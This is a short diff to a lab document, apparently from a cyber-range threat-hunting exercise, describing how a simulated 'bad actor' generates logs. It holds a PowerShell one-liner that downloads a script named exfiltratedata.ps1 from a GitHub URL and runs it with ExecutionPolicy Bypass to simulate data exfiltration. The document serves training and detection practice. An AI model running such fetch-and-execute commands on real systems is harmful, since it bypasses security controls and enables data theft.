@@ -2,7 +2,7 @@
 **Use of Powershell to run "Malicious" script**
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
-1. Execute the following code in Powershell: (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1)
+1. Execute the following code in Powershell: [Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1]
 
 <b>What this script does</B>
 - This script downloads and executes a file named exfiltratedata.ps1 by while bypassing Powershell's security restrictions simulating data theft by a bad actor.
